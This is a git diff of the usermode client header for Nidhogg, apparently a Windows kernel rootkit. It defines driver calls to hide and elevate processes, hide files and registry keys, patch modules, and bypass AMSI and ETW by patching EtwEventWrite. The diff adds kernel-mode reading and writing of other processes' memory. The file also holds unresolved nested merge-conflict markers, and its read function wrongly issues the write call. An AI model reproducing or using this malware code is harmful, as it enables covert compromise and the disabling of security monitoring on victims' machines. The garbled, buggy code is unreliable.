@@ -14,7 +14,7 @@
 #define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_QUERY_PROCESSES CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 <<<<<<< HEAD
 #define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -45,7 +45,12 @@
 =======
 
 #define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
+<<<<<<< HEAD
 >>>>>>> da4b5b2 (Added patching to the usermode side)
+=======
+#define IOCTL_NIDHOGG_WRITE_DATA CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_READ_DATA CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
+>>>>>>> afd6daf (Nidhogg v0.2)
 // *********************************************************************************************************
 
 // ** General Definitions ***************************************************************************************
@@ -61,6 +66,7 @@
 <<<<<<< HEAD
 =======
 #define MAX_PATCHED_MODULES 256
+<<<<<<< HEAD
 >>>>>>> da4b5b2 (Added patching to the usermode side)
 #define MAX_PIDS 256
 #define MAX_FILES 256
@@ -71,6 +77,14 @@
 #define REG_TYPE_KEY 0
 #define REG_TYPE_VALUE 1
 =======
+=======
+#define MAX_FILES 256
+
+#define PROCESS_TYPE_PROTECTED 0
+#define PROCESS_TYPE_SPOOFED 1
+#define MAX_PIDS 256
+
+>>>>>>> afd6daf (Nidhogg v0.2)
 #define REG_TYPE_PROTECTED_KEY 0
 #define REG_TYPE_PROTECTED_VALUE 1
 #define REG_TYPE_HIDDEN_KEY 2
@@ -89,6 +103,12 @@
 #define HKCU_SHORT L"HKCU"
 #define HKCR L"HKEY_CLASSES_ROOT"
 #define HKCR_SHORT L"HKCR"
+
+enum class MODE {
+    KernelMode,
+    UserMode,
+    MaximumMode
+};
 // *********************************************************************************************************
 
 // ** General Structures ***************************************************************************************
@@ -124,6 +144,14 @@ struct RegItem {
     ULONG Type;
     WCHAR KeyPath[REG_KEY_LEN];
     WCHAR ValueName[REG_VALUE_LEN];
+};
+
+struct PkgReadWriteData {
+    MODE Mode;
+    ULONG Pid;
+    SIZE_T Size;
+    PVOID LocalAddress;
+    PVOID RemoteAddress;
 };
 // *********************************************************************************************************
 
@@ -325,7 +353,7 @@ std::vector<DWORD> NidhoggQueryProcesses() {
         return pids;
     }
 
-    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_PROCESSES,
+    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES,
         nullptr, 0,
         &result, sizeof(result), &returned, nullptr)) {
         pids.push_back(NIDHOGG_ERROR_DEVICECONTROL_DRIVER);
@@ -968,4 +996,70 @@ int NidhoggAmsiBypass(DWORD pid) {
 int NidhoggETWBypass(DWORD pid) {
     std::vector<byte> patch = { 0xC3 };
     return NidhoggPatchModule(pid, (wchar_t*)LR"(C:\Windows\System32\Ntdll.dll)", (char*)"EtwEventWrite", patch); 
+}
+
+int NidhoggWriteData(DWORD pid, PVOID remoteAddress, SIZE_T size, MODE mode) {
+    HANDLE hFile;
+    DWORD returned;
+    PkgReadWriteData pkgWrite{};
+    PVOID data = NULL;
+
+    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+    if (hFile == INVALID_HANDLE_VALUE)
+        return NIDHOGG_ERROR_CONNECT_DRIVER;
+
+    pkgWrite.Pid = pid;
+    pkgWrite.RemoteAddress = remoteAddress;
+    pkgWrite.LocalAddress = &data;
+    pkgWrite.Size = size;
+    pkgWrite.Mode = mode;
+
+    if (pkgWrite.LocalAddress == 0 || pkgWrite.RemoteAddress == 0 || pkgWrite.Pid <= 0 || pkgWrite.Size <= 0) {
+        CloseHandle(hFile);
+        return NIDHOGG_GENERAL_ERROR;
+    }
+
+    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_WRITE_DATA,
+        &pkgWrite, sizeof(pkgWrite),
+        nullptr, 0, &returned, nullptr)) {
+        CloseHandle(hFile);
+        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+    }
+
+    CloseHandle(hFile);
+    return NIDHOGG_SUCCESS;
+}
+
+PVOID NidhoggReadData(DWORD pid, PVOID remoteAddress, SIZE_T size, MODE mode) {
+    HANDLE hFile;
+    DWORD returned;
+    PkgReadWriteData pkgRead{};
+    PVOID data = NULL;
+
+    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+    if (hFile == INVALID_HANDLE_VALUE)
+        return (PVOID)NIDHOGG_ERROR_CONNECT_DRIVER;
+
+    pkgRead.Pid = pid;
+    pkgRead.RemoteAddress = remoteAddress;
+    pkgRead.LocalAddress = &data;
+    pkgRead.Size = size;
+    pkgRead.Mode = mode;
+
+    if (pkgRead.LocalAddress == 0 || pkgRead.RemoteAddress == 0 || pkgRead.Pid <= 0 || pkgRead.Size <= 0) {
+        CloseHandle(hFile);
+        return (PVOID)NIDHOGG_GENERAL_ERROR;
+    }
+
+    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_WRITE_DATA,
+        &pkgRead, sizeof(pkgRead),
+        &pkgRead, sizeof(pkgRead), &returned, nullptr)) {
+        CloseHandle(hFile);
+        return (PVOID)NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+    }
+
+    CloseHandle(hFile);
+    return data;
 }
